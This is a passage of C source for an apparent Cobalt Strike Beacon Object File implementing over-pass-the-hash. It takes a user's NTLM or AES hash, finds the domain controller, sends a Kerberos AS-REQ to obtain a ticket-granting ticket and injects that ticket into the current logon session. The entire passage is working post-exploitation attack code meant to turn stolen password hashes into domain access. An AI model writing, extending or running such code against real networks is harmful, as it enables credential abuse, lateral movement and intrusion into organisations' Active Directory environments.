    char *dc = BeaconDataExtract(&parser, NULL);
    int etype = BeaconDataInt(&parser);

    if (!domain || !*domain || !user || !*user || !hash_hex || !*hash_hex) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Usage: overpassthehash --domain X --user Y --hash Z [--dc DC] [--etype 23]\n");
        return;
    }

    /* Convert hash to bytes */
    unsigned char key[32];
    int key_len = hex_to_bytes(hash_hex, key, 32);

    if (etype == 0) etype = 23; /* Default to RC4/NTLM */

    const char *etype_name;
    switch (etype) {
        case 17: etype_name = "AES128"; break;
        case 18: etype_name = "AES256"; break;
        case 23: default: etype_name = "RC4(NTLM)"; etype = 23; break;
    }

    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] Over-Pass-the-Hash\n"
        "    User:   %s@%s\n"
        "    Etype:  %d (%s)\n"
        "    Key:    %.8s...(%d bytes)\n",
        user, domain, etype, etype_name, hash_hex, key_len);

    /* Auto-discover DC */
    char aDC[256] = {0};
    if (dc && *dc) {
        MSVCRT$strncpy(aDC, dc, 255);
    } else {
        wchar_t wDomain[256];
        KERNEL32$MultiByteToWideChar(CP_UTF8, 0, domain, -1, wDomain, 256);
        void *dcInfo = NULL;
        if (NETAPI32$DsGetDcNameW(NULL, wDomain, NULL, NULL, 0, &dcInfo) == 0 && dcInfo) {
            LPWSTR dcName = *(LPWSTR*)dcInfo;
            if (dcName) {
                if (dcName[0] == L'\\' && dcName[1] == L'\\') dcName += 2;
                KERNEL32$WideCharToMultiByte(CP_UTF8, 0, dcName, -1, aDC, 255, NULL, NULL);
            }
            NETAPI32$NetApiBufferFree(dcInfo);
        }
        if (!aDC[0]) {
            BeaconPrintf(CALLBACK_ERROR, "[!] DC auto-discovery failed. Use --dc.\n");
            return;
        }
    }
    BeaconPrintf(CALLBACK_OUTPUT, "    DC:     %s\n", aDC);

    /* Initialize crypto provider */
    HCRYPTPROV hProv;
    if (!ADVAPI32$CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] CryptAcquireContext failed\n");
        return;
    }

    WSADATA wsa;
    WS2_32$WSAStartup(MAKEWORD(2, 2), &wsa);

    /* Build AS-REQ with PA-ENC-TIMESTAMP */
    unsigned char as_req[8192];
    int req_len = build_as_req_with_preauth(hProv, as_req, sizeof(as_req),
                                             user, domain, key, key_len, etype);
    if (req_len <= 0) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to build AS-REQ\n");
        ADVAPI32$CryptReleaseContext(hProv, 0);
        WS2_32$WSACleanup();
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Sending AS-REQ to %s:88 (%d bytes)\n", aDC, req_len);

    /* Send to KDC */
    unsigned char as_rep[65536];
    int rep_len = send_recv_kdc(aDC, as_req, req_len, as_rep, sizeof(as_rep));

    ADVAPI32$CryptReleaseContext(hProv, 0);
    WS2_32$WSACleanup();

    if (rep_len <= 0) {
        BeaconPrintf(CALLBACK_ERROR, "[!] No response from KDC\n");
        return;
    }

    /* Check response type */
    if (as_rep[0] == 0x6B) {
        /* AS-REP — success! */
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Received AS-REP (%d bytes) — TGT obtained!\n", rep_len);

        /* The full AS-REP contains the TGT. We can inject it directly
         * or wrap it in KRB-CRED format for PTT.
         * For simplicity, attempt to inject the raw response. */
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Attempting ticket injection via KERB_SUBMIT_TKT...\n");

        if (inject_ticket(as_rep, rep_len)) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] TGT injected into current logon session!\n");
            BeaconPrintf(CALLBACK_OUTPUT, "[*] Run 'klist' to verify the ticket.\n");
        } else {
            BeaconPrintf(CALLBACK_ERROR,
                "[!] Ticket injection failed (may need SYSTEM for cross-session injection)\n"
                "[*] The raw AS-REP was received — use 'ptt' with the .kirbi to inject manually.\n");
        }
    } else if (as_rep[0] == 0x7E) {
        /* KRB-ERROR */
        BeaconPrintf(CALLBACK_ERROR, "[!] KDC returned KRB-ERROR (%d bytes)\n", rep_len);
        /* Try to extract error code */
        /* error-code is typically near the end in a [6] tagged field */
        BeaconPrintf(CALLBACK_ERROR, "[!] Possible causes: wrong key, wrong etype, clock skew, account locked\n");
    } else {
        BeaconPrintf(CALLBACK_ERROR, "[!] Unexpected response tag: 0x%02X\n", as_rep[0]);
    }
}
